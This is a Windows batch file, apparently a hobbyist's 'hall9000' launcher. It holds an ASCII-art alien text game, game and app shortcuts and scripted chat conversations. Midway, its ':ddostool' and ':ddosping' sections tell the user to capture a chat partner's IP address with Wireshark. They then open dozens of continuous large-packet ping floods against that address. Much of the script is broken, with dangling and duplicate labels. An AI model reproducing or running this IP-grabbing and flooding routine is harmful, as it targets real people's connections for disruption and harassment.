echo                 ```.`````....-++::sssssso-+o+.......``.``                 
echo           ``..--:://-..`````.+oosssssssssss/o:`````...////::-.`           
echo       `.----:://++++-```..-:++./yssssssssss..+/:-..``.++++++++//:-`       
echo   `.-:----//++++++++/-...--::--/sssssssssss------...-/+++++++++++++/:.`   
echo `-:-..-///:://++++++++/:--------+++++o++++/-------:/++++++++++////++++/:. 
echo./++//++++/:-::/+++++++++++//////////////////////++++++++++++/::--/+++oo+/.
echo  .:osyysoo+++++++++++++++++++++++/////+++++++++++++++++++++++++oosyys+:.  
echo     `-/oyyhyyysooo++++++++++++++/-.-::/+++++++++++++++++ossyhhhhy+:.`     
echo         `.:+syyhhhyyyyssooo+++++++++++++++++++ooosssyyyhhhhyo/-`          
echo              `.-/+osyhhhhhhhhyyyyyyyyyyyyyyyhhhhhhhhho+/-.`               
echo                    -yhhhhhhhhhhhhhhhhhhhhhhhhdddddd+                     
echo                     `/syhhhhhhhhhhhhhhhhhhddddddhs-                      
echo                        `-/oyyyhhhhhhhhhhhhhddhyo:.                        
echo                             .-::/+++++++//:-.`       
echo.           
echo Alians:Hello
echo Alians:we are the intergalactic police force
echo Alians:we would like you to join us
echo Alians:we have seen your amaechoing balls punching
echo Alians:we have seen great potential 
echo Alians:we will take you
pause
goto obduction2

:obduction2
echo             `:/ooo`                                                       
echo          `+ydddmNmd:                                                      
echo          dNNNMMMMMNms`                                                    
echo          hMMMMMMMMMNmhosso+/.                                             
echo          oMMMMMMMMMMMdNmMMmhd/                                            
echo        `:yMMMMMMMMNhys+hmMmdh.                                            
echo      `omMMmNNNNNmdh/syhmmmd+`                                             
echo      dMMMMmddddddmmmmmmNNNmdho-```````                                    
echo      +dmNMMMMMMMMMNNmmmmmmmmmmmddddddddhs/`                               
echo       `..:dNNNNNmmmmmmmmNNNNNNNNNNNNNNNNNm+                               
echo         .hmmmmmmmNNNNNmmdddddddmNNNNNNNNdo`                               
echo      .:odmmNNNNNmddhhyhhhhyyyyssNNNNNdy/.                                 
echo   ./ydmNNNNNmdhyhhhhhhyyyyyyyyhdmmhs:.                                    
echo `odmNNNNNNNmoyyyyyyyysyyyyhhhhys++-                                       
echo oNNNNNNNNNNmhhhhyhhhhhhyyso++//////:`                                     
echo .ohddddddddddhyyysoo++//////////////:-`                                   
echo    ``......``` .://///////////////////:.                                  
echo                 .://////////////////////:.                                
echo                  `:///////////////////////-`                              
echo                   `:///////////////////////:-`                            
echo                    `:////////////////////////:.                           
echo                     `://///////////////////////:`                         
echo                      -//////////////////////////-`                       
echo                        -//////////////////////////:.                      
echo `   `  `   `  `   `      -///////////////////////////:.                    
echo ::++os+ssooysshhyhhhys+odhdddddddddddddhhmddmdhmmdddhdhsyysso++++++++//:::.
echo.
echo human has been acquired!
echo ALIANS Out!
pause
goto spaceship

:spaceship
echo.
echo Comander:welcome human
echo Comander:we are Banakafalatans
echo Comander:we have TAKEN you
echo Billy:omfg its like that movie we saw last night
echo Comander:Billy shut it
echo Comander:The subject isnt apropriate
echo Comander:Nevermind Billy please
echo Comander:You will be taken for examination
echo Comander:afterwords if the producers have enough money
echo Comander:Will put you on a space advanture
pause
goto spaceadvanture

:spaceadvanture
echo Comander:you will be traned as the best
echo Comander:you will be seen as one of ours
echo Comander:there will be no compremises
echo Trainer:come with me
echo I will be training you
echo first you need to choose a weapon
echo Standard Blaster (1)/(4-preview)
echo Laser Sword      (2)/(4-preview)
echo Advanced Blaster (3)/(4-preview)
set /p chs6=
if %chs6%== 1 goto stb
if %chs6%== 2 goto lsw
if %chs6%== 3 goto adb
if %chs6%== 4 goto preview1

:lsw
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc2
goto stb

:stb
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc
goto stb

:adw
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc3
goto adw

:trc3
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck20=Enter:
if %atck20%== 1 goto atc20
if %atck20%== 2 goto atc21
goto trc

:atc20 
echo Dummy health:100-65
echo standard attack (1)
echo advanced attack (2)
set /p atck21=Enter:
if %atck21%== 1 goto atc23
if %atck21%== 2 goto atc25

:atc21
echo Dummy health:100-65+10(ice ammo)
echo standard attack (1)
echo advanced attack (2)
set /p atck22=Enter:
if %atck22%== 1 goto atc26
if %atck22%== 2 goto atc27

:atc26
echo Dummy health:25-65
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt23=(Y/N):
if %cnt23%= Y goto spaceadvanture2
if %cnt23%= N goto exit
goto atc22 

:atc27
echo Dummy health:25-65+10(ice ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt24=(Y/N):
if %cnt24%= Y goto spaceadvanture2
if %cnt24%= N goto exit
goto atc12

:atc23
echo Dummy health:35-65
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt25=(Y/N):
if %cnt25%= Y goto spaceadvanture2
if %cnt25%= N goto exit
goto atc22 

:atc25
echo Dummy health:35-65+10(ice ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt26=(Y/N):
if %cnt26%= Y goto spaceadvanture2
if %cnt26%= N goto exit
goto atc12

:trc2
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck2=Enter:
if %atck2%== 1 goto atc3
if %atck2%== 2 goto atc4
goto trc

:atc3 
echo Dummy health:100-40
echo standard attack (1)
echo advanced attack (2)
set /p atck3=Enter:
if %atck3%== 1 goto atc13
if %atck3%== 2 goto atc23

:atc4
echo Dummy health:100-40+10(fire ball)
echo standard attack (1)
echo advanced attack (2)
set /p atck=Enter:
if %atck4%== 1 goto atc14
if %atck4%== 2 goto atc24

:atc24
echo Dummy health:60-40+10(fire ball)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt8=(Y/N):
if %cnt8%= Y goto spaceadvanture2
if %cnt8%= N goto exit
goto atc22 

:atc14
echo Dummy health:50-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt9=(Y/N):
if %cnt9%= Y goto spaceadvanture2
if %cnt9%= N goto exit
goto atc12

:atc23
echo Dummy health:50-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt10=(Y/N):
if %cnt10%= Y goto spaceadvanture2
if %cnt10%= N goto exit
goto atc22 

:atc13
echo Dummy health:60-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt11=(Y/N):
if %cnt11%= Y goto spaceadvanture2
if %cnt11%= N goto exit
goto atc12

:trc
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck=Enter:
if %atck%== 1 goto atc1
if %atck%== 2 goto atc2
goto trc

:atc1 
echo Dummy health:100-45
echo standard attack (1)
echo advanced attack (2)
set /p atck12=Enter:
if %atck12%== 1 goto atc12
if %atck12%== 2 goto atc22

:atc2
echo Dummy health:100-45+10(fire ammo)
echo standard attack (1)
echo advanced attack (2)
set /p atck13=Enter:
if %atck13%== 1 goto atc15
if %atck13%== 2 goto atc25

:atc25
echo Dummy health:55-45+10(fire ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt14=(Y/N):
if %cnt14%= Y goto spaceadvanture2
if %cnt14%= N goto exit
goto atc22 

:atc15
echo Dummy health:45-45
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt15=(Y/N):
if %cnt15%= Y goto spaceadvanture2
if %cnt15%= N goto exit
goto atc12

:atc22
echo Dummy health:55-45+10(fire ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt16=(Y/N):
if %cnt16%= Y goto spaceadvanture2
if %cnt16%= N goto exit
goto atc22 

:atc12
echo Dummy health:55-45
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt17=(Y/N):
if %cnt17%= Y goto spaceadvanture2
if %cnt17%= N goto exit
goto atc12

:preview1
echo (1)-standar blaster
echo (2)-laser sword
echo (3)-advanced blaster
set /p chs7=Enter:
if %chs7%== 1 goto preview2
if %chs7%== 2 goto preview3
if %chs7%== 3 goto preview4

:preview3
cls
echo          D  M  G:40
echo          S P E T I A L:fire ball 
echo.
echo                                   
echo                                                  ````````                 
echo                                              ```...----..`                
echo                                            `..----------.`                
echo                                         ``..------------.`                
echo                                       ``..-----....-----.`                
echo                                     ``..-----..``.-----.``                
echo                                   ``..--:---.``..-----.``                 
echo                                  `..-:::--.``..------.``                  
echo                                ``.-::::-.```..-----..`                    
echo                              ``.--:::-..``..--:---.``                     
echo                             `..-:::--.``..--:::-..`                       
echo                           ``.-::::-.```.--:::--.``                        
echo                          `.--:::-.```..-::::-.``                          
echo                        ``.--::--.```.--:::--.`                            
echo                       `..-::--.```.--:::--.``                             
echo                     ``.-----.```..-::::-.``                               
echo                    .:..---.```..--:::-..`                                 
echo                    `+o:-:.```.--:::--.`                                   
echo                     `-oo///-------..``                                    
echo                     `.+/+yo-.....``                                       
echo                    `::/o::-+o/.`                                          
echo                   .:/+/`    ```                                           
echo                  -/+-                                                     
echo               `:oo-                                                       
echo               `//-  
pause
goto spaceadvanture                                                      
                                                           
:preview2
cls
echo          D  M  G:45
echo          S P E T I A L:fire ammo
echo.
echo                                                                   
echo                   .-:`  ```                                               
echo       ```````.--:/yyyyosyyyo.````                                         
echo      /yyyyssyhhhhhhyyyhhddhs.```        ``                                
echo      -yyhhysssdmdosyyyoohhs``..--:://+osyo/``````........-------.....     
echo      `////.``.yhhhhhhhhhhyyyyyyyyyyyyhhddyyysys------..........------`    
echo        .sysyyyhhhhhhhhdddddhhhhhyoo+++syyyyyyyy:----::::::::::--.``       
echo    -oosshhhddddhhhhhhyyyyyyyyyyo//++++shhhyyyss/:---...`````              
echo    oyyhyyhyyyyhhhhhhhhhhhddddddyyy+--....``                               
echo    sdddddmdmdyssoyhydddhyhhyyy+/-/.                                       
echo    `ohyooo+/:    `yhdddyhhsoy-   `-                                       
echo     ```          `hdmdmhy-.-+. `..                                        
echo                 .yyyhdh:`   `.``                                          
echo                `hyyyyh-                                                   
echo               `hhyyyh-                                                    
echo               odyyyd-                                                     
echo               `+yhdd-                                                     
echo                  `..     
pause
goto spaceadvanture

:preview4                                                 
cls
echo          D  M  G:65    
echo          S P E T I A L:ice ammo
echo.
echo                       `::--..--..-+.`                                  
echo                        ``-ysydyyssyyyydo..```````                         
echo   ```     `://:///::/:oyyhoossdhdhyyhhmddddddhhhs/.``````..`              
echo  .yssssoo+yddyssyyyyyhmyhdyyhhdhdhhhyyhhyyyyyosyyhhyss++//++/-......`.``  
echo  :mhmmmmmmhh/://s///smmhhyhhyddddddhhhhhhyyysosysyysssoooso+y+++////-//:  
echo  +mhdmddddso/-::/--://++s+ssodmdyyhssysyyyyyssysddmmmmmmmdy-.```````````  
echo  sdyyhho:.`                `oyhhs-:``sssssooo/:-:--------:.               
echo `hhhhy:`                  `oyyyo.`.``-```````                             
echo  ....`                    +yhy+`                                          
echo                          `.:/`                                           
pause
goto spaceadvanture                                                                                                       

:spaceadvanture2
echo work in progres....
echo thank you for playing the closed alpha preview 
pause
exit

:viber1
start C:\Users\"fico pico"\AppData\Local\Viber\Viber.exe 
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:steam1
echo.
echo choose an option
echo start steam                               (1)
echo start Fallout New Vegas                   (2)
echo start Terraria                            (3)
echo start Castle Crashers                     (4)
echo start The Elder Scrolls V:Skyrim          (5) 
echo start Saints Row IV                       (6)
echo start Just Cause 2                        (7)
echo start Victor Vran                         (8)
echo start Left 4 Dead 2                       (9)
echo start Lego MARVEL Super Heroes            (10)
echo start Garry's Mod                         (11)
echo start Goat Simulator                      (12)
echo start A Story About My Uncle              (13)
echo start Scrap Mechanic                      (14)
echo start Borderlands:The Pre Sequel          (15)
echo start Hotline Miami                       (16)
echo start Dirt 3:Complete Edition             (17)
echo start Trine 2                             (18)
echo start One Finger Death Punch              (19)
echo start Castlevania:Lords of Shadow         (20)
echo start Far Cry 3                           (21)
echo start Super Meat Boy                      (22)
echo start Metal Gear Solid V:The Phantom Pain (23)
echo start The Witcher 3:Wild Hunt             (24)
echo start Euro Truck Simulator                (25)
echo start Battlefield 4                       (26)
echo start Crysis 3                            (27)
echo start Metro Last Ligh Redux               (28)
echo start Guacamelee Super Turbo Championship (29)
echo start Scribblenauts Unmasked              (30)
echo start Shadow Warrior 2                    (31)
echo start The Vanishing of Ethan Carter       (32)
echo start Tom Clancy's The Division           (33)
echo start Lego Batman 3                       (34)
echo start Just Cause 3                        (35)
echo start Rocket League                       (36)
echo start Tales from the Borderlands          (37)
echo start Sniper Elite 4                      (38)
set /p g=ENTER:
if %g%==1 goto steam2
if %g%==2 goto s2
if %g%==3 goto s3
if %g%==4 goto s4
if %g%==5 goto s5
if %g%==6 goto s6
if %g%==7 goto s7
if %g%==8 goto s8
if %g%==9 goto s9
if %g%==10 goto s10
if %g%==11 goto s11
if %g%==12 goto s12
if %g%==13 goto s13
if %g%==14 goto s14
if %g%==15 goto s15
if %g%==16 goto s16
if %g%==17 goto s17
if %g%==18 goto s18
if %g%==19 goto s19
if %g%==20 goto s20
if %g%==21 goto s21
if %g%==22 goto s22
if %g%==23 goto s23
if %g%==24 goto s24
if %g%==25 goto s25
if %g%==26 goto s26
if %g%==27 goto s27
if %g%==28 goto s28
if %g%==29 goto s29
if %g%==30 goto s30
if %g%==31 goto s31
if %g%==32 goto s32
if %g%==33 goto s33
if %g%==34 goto s34
if %g%==35 goto s35
if %g%==36 goto s36
if %g%==37 goto s37
if %g%==38 goto s38

:s1
start "C:\Program Files (x86)\Steam\Steam.exe"
pause
:s2
start steam://rungameid/22490 
pause
:s3 
start steam://rungameid/105600 
pause
:s4 
start steam://rungameid/204360
pause
:s5
start steam://rungameid/72850
pause
:s6
start steam://rungameid/206420
pause
:s7
start steam://rungameid/8190
pause
:s8
start steam://rungameid/345180
pause
:s9
start steam://rungameid/550
pause
:s10
start steam://rungameid/249130
pause
:s11
start steam://rungameid/4000
pause
:s12
start steam://rungameid/265930
pause
:s13
start steam://rungameid/32500
pause
:s14
start steam://rungameid/278360
pause
:s15
start steam://rungameid/387990
pause
:s16
start steam://rungameid/219150
pause
:s17
start steam://rungameid/321040
pause
:s18
start steam://rungameid/35720
pause
:s19
start steam://rungameid/264200
pause
:s20
start steam://rungameid/234080
pause
:s21
start steam://rungameid/220240
pause
:s22
start steam://rungameid/40800
pause
:s23
start steam://rungameid/287700
pause
:s24
start steam://rungameid/292030
pause
:s25
start steam://rungameid/227300
pause
:s26
start "D:\Program Files (x86)\Origin Games\Battlefield 4\BF4X86WebHelper.exe"
pause
:s27
start "D:\Program Files (x86)\Origin Games\Crysis 3\bin32\Crysis3.exe"
pause
:s28
start steam://rungameid/287390
pause
:s29
start steam://rungameid/275390
pause
:30
start steam://rungameid/249870
pause
:s31
start steam://rungameid/324800
pause
:s32
start steam://rungameid/400430
pause
:s33
start steam://rungameid/365590
pause
:s34
start steam://rungameid/313690
pause
:s35
start steam://rungameid/225540
pause
:s36
start steam://rungameid/252950
pause
:s37
start steam://rungameid/330830
pause
:s38
start steam://rungameid/312660
pause

:movie1
start telnet towel.blinkenlights.nl
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:skype1
echo.
start skype.exe 
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:mp3juices1
echo.
echo you have chosen musicfree
echo when the page opens type in the song you want in the search bar
echo then choose the song and click download  
start https://wwww.mp3juices.com/
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:youtube1
echo.
echo you have chosen youtube 
start https://www.youtube.com/
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:10youtube
echo.
echo you have chosen videodownloader
echo after the page has loaded
echo in the search bar type in the video you want to download
echo then select the format you want to download it in
start https://10youtube.com/
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:chrome1
echo.
start chrome.exe
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:matrix
echo.
echo thank you for using hall9000 services
echo type in matrix to begin
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p matirx123=
if %matirx123%== matrix goto delete
if %matirx123%== back goto hl9k
if %matirx123%== exit goto exit 

:ddos
echo.
echo what is the ip that you want to ddos
set /p ip=
echo is %ip% correct?
set /p thankyou=
if %thankyou%== yes goto ping
if %thankyou%== no goto ddos

:ddostool
echo.
echo before we begin to find someones ip you need to be talking to him on:
echo steam chat,skype,omegle
echo when you have done that type in continue
set /p cnt200=
if %cnt200%== continue goto instruction2

:instruction2
echo you will be provided with a program called wireshark
echo in the section called "using this fillter" type in "udp"
echo a lot of ip's will pop up
echo whait for about 10 seconds and click the red button on top
echo one of those will be someones ip
start wireshark.exe
echo.
echo loading..
ping localhost -n 2 >nul
cls
echo laoding...
ping localhost -n 2 >nul
cls
echo connected
echo when you have the ip press any button to continue
pause
echo please insert the ip you whant to ddos
set /p ip=
echo type in continue to ddos
set /p answer200=
if %answer200%== continue goto ddosping

:ddosping
color 17
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
goto delete

:delete
color 0D
echo.
echo ok,chow!!!
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto random

:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto werdy 
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%  %random%
goto random

:hl9
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2 >nul
cls
pause
echo hi there
echo this is the place where you choose
echo do you want to go with conversation1
echo or with conversation2
echo or with conversation3
echo conversation1 offers a nice conversation about videogames
echo conversation2 offers a conversation about movies
echo conversation3 offers a conversation about music
set /p choosen=
if %choosen%== conversation1 goto conversation1
if %choosen%== conversation2 goto conversation2
if %choosen%== conversation3 goto conversation3

:conversation3
echo you have chosen convesation2
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great3
if %emotion%== good goto good3
if %emotion%== bad goto bad3
if %emotion%== sad goto Sad3
if %emotion%== amaechoing goto amaechoing3
if %emotion%== fine goto fine3

:fine3
color 03
echo i guess thats not bad...
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:amaechoing3
color 06
echo wonderfull,lets start
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:good3
color 3
echo thats nice
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:Sad3
color 5
echo whell i hope i will change that
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:bad3
color 4
echo thats bad to hear...
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:great3
color 2
echo thats wonderfull
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:music123
echo.
echo you have chosen my music services
echo to download music for free type in musicfree
echo to play music start up fucking media player
echo to buy music,i dont know,i dont sell any 
echo to listen to music on youtube type in youtube
echo to download youtube videos type in videodownloader
set /p answergiven123=
if %answergiven123%== musicfree goto mp3juices
if %answergiven123%== youtube goto youtube2
if %answergiven123%== videodownloader goto 10youtube

:conversation2
echo.
echo you have chosen convesation2
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great2
if %emotion%== good goto good2
if %emotion%== bad goto bad2
if %emotion%== sad goto Sad2
if %emotion%== amaechoing goto amaechoing2
if %emotion%== fine goto fine2

:fine2
color 03
echo.
echo whell thats good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:amaechoing2
color 06
echo.
echo thats wonderfull,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:great2
color 2
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:good2
color 3
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:Sad2
color 5
echo.
echo veary sorry to hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:bad2
color 4
echo.
echo sorry too hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:thoughts1
echo. 
echo so what did you think about it
echo did you like it?
set /p sqloved=
if %sqloved%== yes goto sqloved1
if %sqloved%== no goto sqloved2

:sqloved1
echo. 
echo whell thats your thoughts
echo i didnt 
echo but everyone has there own opinion
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:sqloved2
echo. 
echo whell thats your thoughts
echo i didnt either
echo but everyone has there own opinion
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:thoughts2
echo.
echo whell dont watch it
echo its a peace of shit movie
echo the rating are right for it
echo dont spend your time
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron man
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:whiplash1
echo.
echo wow,not many have wathced that one
echo but i love it
echo its amaechoing that someone else i can speak to has watched it too
echo whell that was it for now
echo we can continue our conversation another time
echo if you want to talk to me for longer choose conversation1
echo thank you for talking with me
echo and will see eachother later
echo bye
set /p idontlikethis=
if %idontlikethis%== bye goto bb8

:bb8
echo.
echo %random%

:conversation1
echo .
echo you have chosen conversation1
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great
if %emotion%== good goto good
if %emotion%== bad goto bad
if %emotion%== sad goto Sad
if %emotion%== amaechoing goto amaechoing
